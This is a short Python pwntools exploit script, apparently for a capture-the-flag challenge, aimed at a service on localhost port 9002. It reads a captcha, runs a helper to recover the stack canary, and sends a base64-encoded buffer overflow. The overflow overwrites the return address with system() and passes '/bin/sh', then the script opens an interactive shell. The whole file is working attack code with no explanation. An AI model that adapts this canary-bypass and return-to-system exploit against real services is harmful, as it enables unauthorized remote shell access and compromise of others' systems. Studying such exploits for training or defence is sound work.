from pwn import *

SYSTEM = 0x8048880
G_ENCODED_ADDR = 0x0804b0e0
ENCODED_PAYLOAD_LEN = 720

conn = remote('localhost', 9002)

conn.recvuntil(' : ')
captcha = conn.readline().strip()

print '[+] captcha: {}'.format(captcha)

proc = process(['./get_canary', captcha])

canary = int(proc.readall().strip(), 16)

print '[+] canary: {}'.format(canary)

conn.sendline(captcha)
conn.recvuntil('paste me!\n')

payload = b64e('A'*512 + p32(canary) + 'A'*12 + p32(SYSTEM) + "A"*4 + p32(G_ENCODED_ADDR + ENCODED_PAYLOAD_LEN)) + '/bin/sh\x00'
print payload

conn.sendline(payload)

conn.interactive()
